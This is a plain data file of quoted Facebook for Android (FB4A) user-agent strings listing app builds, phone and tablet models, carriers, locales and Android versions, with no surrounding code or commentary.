"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBCR/Meteor;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI GRA-L09;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/Vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9295;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/Vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/o2 - de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3 IRL;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3 IRL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/48;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Fido;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900T1;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Rogers Wireless;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2005;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Tesco Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/eir;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris M5;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/BOMOV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900M;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N900;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/Orange Communications SA;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/Proximus;FBMF/elephone;FBBD/elephone;FBPN/com.facebook.katana;FBDV/Elephone P8000;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/nb_NO;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G901F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/O2-IRL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_US;FBCR/3 IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2392};FBLC/en_US;FBCR/Bell;FBMF/Huawei;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 6P;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/pt_BR;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Bell;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Fido;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Koodo;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGLS990;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/eir;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/de_DE;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/el_GR;FBCR/GR COSMOTE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/redONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910C;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/vodafone UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Videotron;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/nl_NL;FBCR/NL KPN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1532,height=2560};FBLC/de_DE;FBCR/Telekom.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N915FY;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=2392,height=1440};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=2560,height=1440};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748129;FBDM/{density=1.5,width=1200,height=1848};FBLC/en_GB;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/YOGA Tablet 2-1050F;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748131;FBDM/{density=2.0,width=1200,height=1824};FBLC/es_ES;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/K01H;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748131;FBDM/{density=2.0,width=1200,height=1824};FBLC/ru_RU;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB S8-50L;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/61.0.0.8.69;FBBV/20569008;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-LS980;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/F SFR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530FZ;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1280};FBLC/nl_NL;FBCR/Tele2 NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=1200,height=1824};FBLC/fr_FR;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Siminn;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
